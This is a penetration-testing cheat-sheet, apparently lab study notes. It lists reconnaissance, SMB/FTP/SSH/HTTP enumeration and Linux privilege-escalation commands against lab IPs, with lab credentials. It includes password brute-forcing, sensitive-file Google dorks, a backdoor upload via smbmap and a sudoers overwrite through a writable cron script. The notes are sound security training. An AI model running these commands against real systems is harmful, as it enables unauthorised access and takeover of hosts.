# Cheat-sheet 
----------------------

Assessment methodologies :

* Information Gathering :
  
 1 Passive Information Gathering :

  
1. `host hackersploit.org`
2. robots file - ****https://hackersploit.org/robots.txt
3. site map - https://hackersploit.org/sitemap_index.xml
4. Web tech - **Wappalyzer, built with** extensions 
5. `whatweb [hackersploit.org](http://hackersploit.org)` 
6. Download whole website - **HTTrack** 
7. **Who is** 
- `whois [hackersploit.org](http://hackersploit.org)`
- `whois 172.64.32.93`
- Sites : [who.is](http://who.is) [domaintools.com](http://domaintools.com)
1. Website footprinting with **Netcraft** - **https://sitereport.netcraft.com/?url=https%3A%2F%2Fhackersploit.org**
2. **Dnsrecon**
- `dnsrecon -d [hackersploit.org](http://hackersploit.org/)`
- Site: dnsdumpster.com
1. **WAF** 
- Download : https://github.com/EnableSecurity/wafw00f
- `wafw00f [hackertube.net](http://hackertube.net/) -a`
1. Subdomain Enumeration - **Sublist3r**
- `sublist3r -d [hackersploit.com](http://hackersploit.com/) -o hs_sub_enum.txt`
1. **Google dorks**
- site:ine.com
- site:ine.com employees
- site:ine.com inurl:forum
- site:*.ine.com
- site:*.ine.com intitle:forum
- site:*.ine.com filetype:pdf
- inurl:auth_user_file.txt
- inurl:passwd.txt
- inurl:wp-config.bak
1. waybackmachine 
2. **Email Harvesting** 
- `theHarvester -d [hackersploit.org](http://hackersploit.org/)`
- `theHarvester -d [hackersploit.org](http://hackersploit.org/) -b google,linkedin,dnsdumpster,duckduckgo,crtsh`
- `theHarvester -d [zonetransfer.me](http://zonetransfer.me/) -b all`
1. Leaked Passwords database : https://haveibeenpwned.com/
 --------------------------------------------------------------------------------------------------------------
 2 Active Information Gathering 
 1. DNS record & Zone Transfer `dnsenum [zonetransfer.me](http://zonetransfer.me)` 
2. Host discovery with Nmap 
- `cat /etc/hosts`
- `nmap -sn 192.168.2.0/24`
- `netdiscover -i eth0 -r 192.168.2.0/24`
1. Port Scanning with nmap 
- `nmap 192.168.2.3`
- `nmap -Pn 192.168.2.3`
- `nmap -Pn -p- 192.168.2.3`
- `nmap -Pn -p- -F -sU 192.168.2.3`
- `nmap -p 80,44 192.168.2.3`
- `nmap -p- -sV 192.168.2.3`
- `nmap -sV -p- -O 192.168.2.3`
- `nmap -Pn -F 192.168.2.3 -oN outputfile.txt`

  -----------------------------------------------------------
#### Foot printing & Scanning 

1. Wireshark
2. Arp scan `arp-scan -I eth1 192.168.31.0/24`
3. Ping `ping 192.168.31.2`
4. fping `fping -I eth1 -g 192.168.31.0/24 -a`
5. nmap `nmap -sn 192.168.31.0/24`
6. Zenmap - GUI of nmap

--------------------------------------------------------------

* Enumeration :

- SMB
    
    SMB (**Server Message Block**) - a network file and resource sharing protocol, based on a client-server model. Usually SMB can be found on ports **139 or 445** 
    
    **SMB nmap scripts** 
    
    `nmap -p445 -sV -sC -O <TARGET_IP>`
    
    After finding SMB through port scanning, gather more information with nmap.
    
    - `nmap -p445 --script smb-protocols 10.2.24.25` - SMB Protocols
    - `nmap -p445 --script smb-security-mode 10.2.24.25` - SMB Security levels
    - `nmap -p445 --script smb-enum-sessions 10.2.24.25` - SMB logged in users
    - `nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - login admin default
    - `nmap -p445 --script smb-enum-shares 10.2.24.25` - SMB shares
    - `nmap -p445 --script smb-enum-users 10.2.24.25` - SMB users
    - `nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - SMB windows users
    - `nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Server statistics
    - `nmap -p445 --script smb-enum-domains--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - system domains
    - `nmap -p445 --script smb-enum-groups--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Available groups
    - `nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Services
    - `nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - ls cmd
    
    **SMBMap** 
    
    - `nmap -p445 --script smb-protocols 10.2.21.233`
    - `smbmap -u guest -p "" -d . -H 10.2.21.233`
    - `smbmap -u administrator -p smbserver_771 -d . -H 10.2.21.233` - Login
    - `smbmap -u administrator -p smbserver_771 -H 10.2.21.233 -x 'ipconfig’` - Running commands
    - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -L` - List all drives
    - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -r 'C$’` - List directory contents
    - `smbmap -u admin -p password1 -H 192.174.58.3` - SMB shares using credentials
    - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --upload '/root/sample_backdoor' 'C$\sample_backdoor’` - Upload file
    - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --download 'C$\flag.txt’` - Download a file
    
    **SMB Recon - Basics 1** 
    
    - `nmap -sV -p 139,445 192.28.157.3`
    - `nmap --script smb-os-discovery -p 445 192.28.157.3` - SMB OS detection
    
    **rpcclient** 
    
    It is a tool for executing client side MS-RPC functions
    
    - `nmap 192.230.128.3`
    - `rpcclient -U "" -N 192.230.128.3`
    - rpcclient $> `srvinfo`
    - rpcclient $> `enumdomusers` - users
    - rpcclient $> `enumdomgroups` - groups
    - rpcclient $> `lookupnames admin` - SID of user “admin” using rpcclient.
    
    **enum4linux** - tool for enumerating data from Windows and Samba hosts 
    
    - `enum4linux -o 192.230.128.3`
    - `enum4linux -U 192.230.128.3` - users
    - `enum4linux -S 192.187.39.3` - shares
    - `enum4linux -G 192.187.39.3` - domain groups
    - `enum4linux -i 192.187.39.3` - Check if samba server is configured for printing
    - `enum4linux -r -u "admin" -p "password1" 192.174.58.3` - List users SUID
    
    **Metasploit** 
    
    - `use auxiliary/scanner/smb/smb_version`
    - `use auxiliary/scanner/smb/smb_enumusers`
    - `use auxiliary/scanner/smb/smb_enumshares`
    - `use auxiliary/scanner/smb/pipe_auditor` - user cred: admin-password1
    
    **nmblookup** 
    
    NetBIOS over TCP/IP client used to lookup NetBIOS names
    
    - `nmblookup -A 192.28.157.3`
    
    **smbclient** 
    
    Ftp-like client to access SMB/CIFS resources on servers
    
    - `smbclient -L 192.28.157.3 -N`
    - `smbclient [//192.187.39.3/public](https://192.187.39.3/public) -N`
    - `smbclient -L 192.28.157.3 -U jane` - use “abc123” as password
    - `smbclient [//192.174.58.3/jane](https://192.174.58.3/jane) -U jane`
    - `smbclient [//192.174.58.3/admin](https://192.174.58.3/admin) -U admin` - use “password1” as password
    - `smb> get flag` - Important cat and type wont work in smb
    
    **Dictionary Attack** 
    
    - `nmap -Pn -sV 192.174.58.3`
    - `msfconsole`
    - `use auxiliary/scanner/smb/smb_login`
    - `set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt`
    - `set SMBUser jane` - Known already specified in the lab description, will not be same in the exam
    - `set RHOSTS 192.174.58.3`
    - `exploit`
    
    **Hydra** 
    
    - `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.174.58.3 smb`
 
      ------------------------------------------------------------------------------

* FTP
    
    FTP (**File Transfer Protocol**) - a client-server protocol used to transfer files between a network using TCP/UDP connections.
    Default FTP port is **21**, opened when FTP is activated for sharing data.
    
    - `nmap -p21 -sV -sC -O 192.217.238.3`
    - Try Anonymous login `ftp 192.217.238.3` - failed
    - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.217.238.3 -t 4 ftp`- hydra brute force
    - `nmap --script ftp-brute --script-args userdb=/root/users -p21 192.217.238.3` - nmap to brute password
    - `nmap --script ftp-anon -p21 192.119.169.3` - nmap anonymous login script
 
-----------------------------------------------------------------------------------------------


* SSH
    
    SSH (**Secure Shell Protocol)** - a cryptographic network protocol for operating network services securely over an unsecured network, based on a client-server model. Default SSH TCP port is **22**.
    
    - `nmap -p22 -sV -sC -O 192.8.3.3`
    - `nc 192.8.3.3 22` - Banner grabbing
    - `ssh [root@192.8.3.3](mailto:root@192.8.3.3) 22`
    - `nmap --script ssh2-enum-algos 192.8.3.3` - nmap enum-alogo script
    - `nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.8.3.3` - nmap ssh hostkey script
    - `nmap -p22 --script ssh-auth-methods --script-args="ssh.user=student" 192.8.3.3` - nmap ssh auth method scripts
    - `ssh student@192.8.3.3`
    
    **Dictionary Attack** 
    
    - `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.230.83.3 ssh`
    - `nmap -p22 --script=ssh-brute --script-args userdb=/root/users 192.230.83.3`
    - Msfconsole
        - `use auxiliary/scanner/ssh/ssh_login`
        - `set RHOSTS 192.230.83.3`
        - `set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt`
        - `set STOP_ON_SUCCESS true`
        - `set VERBOSE true`
        - `exploit`


----------------------------------------------------------------------------------------



* HTTP
    
    HTTP (**Hyper Text Transfer Protocol**) - a client-server application layer protocol, used to load web pages using hypertext links.
    Default HTTP port is **80** and HTTPS port is **443.**
    
    - `nmap -p80 -sV -O 10.4.16.17`
    - `whatweb 10.4.16.17`
    - `http 10.4.16.17`
    - `dirb [http://10.4.16.17](http://10.4.16.17/)`
    - `browsh --startup-url http://10.4.16.17/Default.aspx`
    - `nmap --script=http-enum -sV -p80 10.4.21.207` - http enum nmap script
    - `nmap -sV -p 80 10.4.21.207 -script banner`
    - `nmap --script=http-methods --script-args http-methods.url-path=/webdav/ -p80 10.4.21.207` - http methods nmap script
    - `curl 192.199.232.3 | more` - curl cmd
    - `use auxiliary/scanner/http/brute_dirs` - Directory brute-force
    - `use auxiliary/scanner/http/http_version` - http version
    
    **HTTP Login** 
    
    - `msfconsole`
    - `use auxiliary/scanner/http/http_login`
    - `set RHOSTS 192.199.232.3`
    - `set USER_FILE /tmp/users`
    - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
    - `set VERBOSE false`
    - `set AUTH_URI /dir/`


  ----------------------------------------------------------------------------------------------


  - Linux Privilege Escalation
    
    **Cron jobs**
    
    - `whoami
    groups student
    cat /etc/passwd
    crontab -l`
    - `cd /`
    - `grep -rnw /usr -e "/home/student/message"`
    - `grep -rnw /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message`
    - `ls -al /usr/local/share/copy.sh`
    - `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
    - `cat /usr/local/share/copy.sh`
    - `echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers`
    - `sudo -l`
    - `sudo su`
    - Got root priviledges
   
    -------------------------------
  * SUID
   
    - - `pwd`
- `la -al`
- identify that welcome file have s binaries specifies
- `find welcome`
- `strings welcome`
- `rm greetings
cp /bin/bash greetings
./welcome`
- `cd /root`
-
